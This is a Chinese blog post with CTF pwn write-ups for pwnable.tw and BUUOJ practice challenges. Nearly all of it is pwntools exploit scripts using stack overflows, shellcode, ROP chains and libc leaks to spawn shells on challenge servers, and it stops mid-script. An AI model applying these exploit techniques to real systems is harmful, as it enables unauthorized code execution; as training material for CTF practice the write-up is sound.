<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN Writeup | devoke's blog</title><meta name="author" content="devoke"><meta name="copyright" content="devoke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PwnableStart  保护全关,有两个系统调用 write 和 read ,显然是通过栈溢出来执行栈上的shellcode 12#define __NR_read 3#define __NR_write 4	  12345678910111213141516171819202122.text:"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/20/B6y8wIH5iltGxP9.png"><link rel="canonical" href="http://example.com/2021/07/08/WriteUp/PWN-Writeup/index.html"><link rel="preconnect"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/"><link rel="stylesheet" href="/" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: '/',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: ,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-02-20 10:02:15'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/05/04/Zav4zFVukLJMBKI.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/02/20/h3iOcSdRqel45vD.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="devoke's blog"><span class="site-name">devoke's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-08T14:37:27.000Z" title="发表于 2021-07-08 22:37:27">2021-07-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-20T02:02:15.000Z" title="更新于 2024-02-20 10:02:15">2024-02-20</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h1><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><img src="https://i.loli.net/2021/03/29/wNcT7oOPmBr85pX.png" alt="image-20210329232134162" style="zoom:50%;" />

<p>保护全关,有两个系统调用 write 和 read ,显然是通过栈溢出来执行栈上的shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4	</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 push    esp</span><br><span class="line">.text:08048061 push    offset _exit</span><br><span class="line">.text:08048066 xor     eax, eax</span><br><span class="line">.text:08048068 xor     ebx, ebx</span><br><span class="line">.text:0804806A xor     ecx, ecx</span><br><span class="line">.text:0804806C xor     edx, edx</span><br><span class="line">.text:0804806E push    &#x27;:FTC&#x27;</span><br><span class="line">.text:08048073 push    &#x27; eht&#x27;</span><br><span class="line">.text:08048078 push    20747261h</span><br><span class="line">.text:0804807D push    74732073h</span><br><span class="line">.text:08048082 push    2774654Ch</span><br><span class="line">.text:08048087 mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D mov     al, 4</span><br><span class="line">.text:0804808F int     80h                             ; LINUX - sys_write</span><br><span class="line">.text:08048091 xor     ebx, ebx</span><br><span class="line">.text:08048093 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095 mov     al, 3</span><br><span class="line">.text:08048097 int     80h                             ; LINUX - write</span><br><span class="line">.text:08048099 add     esp, 14h</span><br><span class="line">.text:0804809C retn</span><br></pre></td></tr></table></figure>

<p>程序一开始把esp压栈,可以通过write泄露这里的esp 覆盖20位buf空间,将08048087覆盖return address </p>
<p>然后 esp, 14h -&gt; return  栈空间恢复为初始状态 ,esp 指向 08048060 压入的esp </p>
<p>然后程序跳转08048087 ,把当前esp 上的地址输出 , 得到FFB3D050 再减4就是当前esp了</p>
<p><img src="https://i.loli.net/2021/03/30/tzxYj83qlRoCF6c.png" alt="image-20210330100447337"></p>
<p>有了这个地址,就可以写shellcode了 ,由于 add esp,14h,所以仍然需要覆盖20位buf空间 才能覆盖返回地址 20个占位字符 4是返回地址 , 8 是bin&#x2F;sh空间</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov al,11</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;a&quot;</span>*<span class="number">20</span> + p32(<span class="number">0x8048087</span>))</span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>)) - <span class="number">4</span> </span><br><span class="line">p.send(<span class="string">b&quot;a&quot;</span>*<span class="number">20</span> + p32(esp + <span class="number">20</span> + <span class="number">4</span> + <span class="number">8</span>) +  <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    jmp init</span></span><br><span class="line"><span class="string">orw:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ecx,0</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x60</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx,eax</span></span><br><span class="line"><span class="string">    mov ebx,0x1  </span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">init:</span></span><br><span class="line"><span class="string">    call orw</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Give my your shellcode:&quot;</span>)</span><br><span class="line">p.sendline(asm(code))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>call指令 把 路径 作为return address压入栈中 pop ebx 传入字符串</p>
<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29408</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> + p32(get_flag) +  p32(<span class="number">0x804E6A0</span>) + p32(a1) + p32(a2) <span class="comment">#exit</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>让程序正常退出 exit做return adress</p>
<h3 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h3><p>泄露GOT 获取libc基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25965</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rop = flat([write_plt,<span class="number">0x80484C6</span>,<span class="number">1</span>,read_got,<span class="number">4</span>])</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span> + rop</span><br><span class="line">p.sendline(payload)</span><br><span class="line">off = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(off))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,off)</span><br><span class="line">libcbase = off -libc.dump(<span class="string">&#x27;read&#x27;</span>) </span><br><span class="line">addr_system=libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">addr_binsh=libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = flat([addr</span><br><span class="line">            _system,<span class="number">0x80484C6</span>,addr_binsh])</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span> + rop</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h1><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27213</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;level2_x64&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;level2_x64&quot;</span>)</span><br><span class="line">sys_adr = <span class="number">0x0004004C0</span></span><br><span class="line">bin_adr = <span class="number">0x000600A90</span></span><br><span class="line">pop_rdi = <span class="number">0x00000004006b3</span></span><br><span class="line">main_adr = <span class="number">0x0000000400620</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span> +p64(pop_rdi) + p64(bin_adr) + p64(sys_adr) + p64(main_adr) + p64(main_adr) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29994</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;bjdctf_2020_babyrop&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">put_adr = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main_adr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;story!\n&quot;</span>)</span><br><span class="line">rop1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + flat([pop_rdi,libc_got,put_adr,main_adr])</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">libc_real = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;real: &quot;</span> + <span class="built_in">hex</span>(libc_real))</span><br><span class="line"></span><br><span class="line">system_adr = libc_real + <span class="number">0x24c50</span></span><br><span class="line">binsh_adr = libc_real + <span class="number">0x16c617</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;story!\n&quot;</span>)</span><br><span class="line">rop2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + flat([pop_rdi,binsh_adr,system_adr,main_adr])</span><br><span class="line"></span><br><span class="line">p.sendline(rop2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-1"><a href="#ciscn-2019-1" class="headerlink" title="ciscn_2019_1"></a>ciscn_2019_1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29436</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line"></span><br><span class="line">put_adr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi= <span class="number">0x0000000000400c83</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">enc_adr = elf.sym[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span>  + flat([pop_rdi,puts_got,put_adr,enc_adr])</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ed&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_real = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_real))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_real)</span><br><span class="line">libcbase = puts_real -libc.dump(<span class="string">&#x27;puts&#x27;</span>) </span><br><span class="line">addr_system=libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">addr_binsh=libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr=<span class="number">0x00000000004006b9</span> </span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span>  + flat([ret_addr,pop_rdi,addr_binsh,addr_system]) <span class="comment">#Ubuntu 18 需要栈对齐</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ed&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="not-the-same"><a href="#not-the-same" class="headerlink" title="not_the_same"></a>not_the_same</h2><p>write</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26237</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">secret_adr = elf.sym[<span class="string">&#x27;get_secret&#x27;</span>]</span><br><span class="line">main_adr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">flag_adr = <span class="number">0x80ECA2D</span></span><br><span class="line">write_adr = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span> + flat([secret_adr,write_adr,flag_adr,<span class="number">1</span>,flag_adr,<span class="number">45</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h2><p>off by one 没有\x00截断，直接输出rbp指向的地址，将shellcode写入栈中，并把free got内容覆盖成shellcode起始地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29895</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x00602018</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">payload = shellcode + (<span class="number">48</span>-<span class="built_in">len</span>(shellcode))*<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">offset = -<span class="number">80</span></span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)[<span 